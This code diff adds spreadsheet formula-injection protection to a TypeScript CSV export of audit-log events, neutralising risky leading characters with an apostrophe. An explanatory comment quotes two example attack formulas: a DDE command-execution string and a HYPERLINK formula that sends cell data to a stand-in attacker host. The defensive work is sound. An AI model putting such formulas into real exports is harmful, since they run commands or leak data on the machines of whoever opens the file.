@@ -11,10 +11,32 @@ import type { AuditEvent } from './model.js';
 // details column carries the event's JSON verbatim inside one field, which is
 // the case that breaks naive exporters, so it is tested.
 
-/** RFC 4180 field escaping. */
+// Formula injection. A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`,
+// tab or CR as a formula, not as text, and evaluates it when the file is
+// opened — `=cmd|'/c calc'!A0`, `=HYPERLINK("http://attacker/"&A1)` and their
+// relatives. Every one of those characters is legal in a page title, a
+// send-back comment, a source name or an imported filename, and all of those
+// reach the audit log and therefore this export. The reader on the other end is
+// a compliance lead double-clicking the file, which is exactly the person this
+// must not happen to.
+//
+// The neutralisation is the conventional one: prefix a single apostrophe, which
+// every spreadsheet reads as "the rest of this cell is text" and strips on
+// display. It is a visible change to the value — that is why it is applied only
+// to a cell that would otherwise be executed, and why a field that is simply a
+// number (including a negative one) is left exactly as it was.
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+function neutralize(text: string): string {
+  if (!FORMULA_LEAD.test(text)) return text;
+  if (text.trim() !== '' && Number.isFinite(Number(text))) return text; // -42 is a number, not a formula
+  return `'${text}`;
+}
+
+/** RFC 4180 field escaping, with spreadsheet formulas defused (see above). */
 export function csvField(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const text = typeof value === 'string' ? value : String(value);
+  const text = neutralize(typeof value === 'string' ? value : String(value));
   const needsQuotes = /["',\r\n]/.test(text) || text !== text.trim();
   // A comma or quote always forces quoting; a bare apostrophe does not, but the
   // test above is cheap and quoting more than required is still valid CSV.
